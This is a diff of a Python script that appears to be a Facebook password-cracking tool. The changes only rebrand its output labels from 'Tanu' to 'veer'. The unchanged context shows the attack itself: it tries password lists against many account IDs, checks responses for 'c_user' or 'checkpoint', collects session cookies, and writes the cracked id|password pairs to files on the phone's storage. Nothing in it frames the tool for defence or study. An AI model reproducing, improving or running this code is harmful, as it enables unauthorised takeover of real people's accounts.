@@ -223,7 +223,7 @@ def Fof():
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
-			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
+			print(f"\033[1;36m Use jhaaz For Speed Up\033[1;37m")
 			linex()
 			for user in fo:
 				ids,names = user.split('|')
@@ -270,7 +270,7 @@ def m1(ids,names,passlist):
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Tanu\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [veer\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/veer•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
@@ -278,7 +278,7 @@ def m1(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Tanu•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;208m [veer•CP] '+ids+' • '+pas+'\033[1;97m')
                                         open(f'/sdcard/veer•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -294,7 +294,7 @@ def m1(ids,names,passlist):
 
 def m2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [Tanu] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [veer] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -323,7 +323,7 @@ def m2(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Tanu•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;208m [veer•CP] '+ids+' • '+pas+'\033[1;97m')
                                         open(f'/sdcard/veer•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
